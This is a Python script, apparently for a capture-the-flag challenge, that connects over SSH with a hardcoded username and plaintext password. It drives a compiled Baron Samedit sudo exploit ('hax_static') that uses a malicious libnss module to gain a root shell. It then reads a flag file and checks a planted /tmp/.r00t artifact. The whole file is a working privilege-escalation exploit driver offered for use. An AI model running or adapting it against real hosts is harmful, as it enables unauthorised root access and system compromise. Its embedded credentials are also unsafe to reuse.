#!/usr/bin/env python3
"""
Interactive Baron Samedit trigger.

* opens a real PTY shell (invoke_shell)
* runs ./hax_static <target> from /run/lock/samedit2/out
* if sudo prompts for a password, feeds maya.chen's password
* reports whatever comes back (root shell output / flag dump)
No blind loops, no script timeouts around the exploit itself.
"""
import sys
import time

import paramiko

HOST = "0.cloud.chals.io"
PORT = 32779
USER = "maya.chen"
PASS = "Onboard-Maya25!"
TARGET = sys.argv[1] if len(sys.argv) > 1 else "1"
OUTDIR = "/run/lock/samedit2/out"


def drain(chan, seconds):
    end = time.time() + seconds
    buf = b""
    while time.time() < end:
        try:
            d = chan.recv(65536)
            if not d:
                break
            buf += d
        except Exception:
            time.sleep(0.2)
    return buf.decode(errors="replace")


def main():
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USER, password=PASS,
              timeout=30, allow_agent=False, look_for_keys=False)
    chan = c.invoke_shell()
    chan.settimeout(1)
    time.sleep(1.5)
    try:
        chan.recv(65536)
    except Exception:
        pass

    print("### ensure module name variants exist")
    chan.send("cd %s && cp -n 'libnss_X/P0P_SH3LLZ_ .so.2' 'libnss_X/P0P_SH3LLZ_.so.2' 2>/dev/null; "
              "ls -b libnss_X\n" % OUTDIR)
    time.sleep(1.5)
    print(drain(chan, 3))

    print("### trigger")
    chan.send("./hax_static %s\n" % TARGET)
    out = drain(chan, 6)
    print(out)
    if "password" in out.lower():
        print("### feeding password")
        chan.send(PASS + "\n")
        out2 = drain(chan, 8)
        print(out2)

    print("### post")
    chan.send("id; echo ---; cat /tmp/flag_out 2>/dev/null; echo ---; ls -l /tmp/.r00t 2>/dev/null\n")
    print(drain(chan, 6))
    c.close()


if __name__ == "__main__":
    main()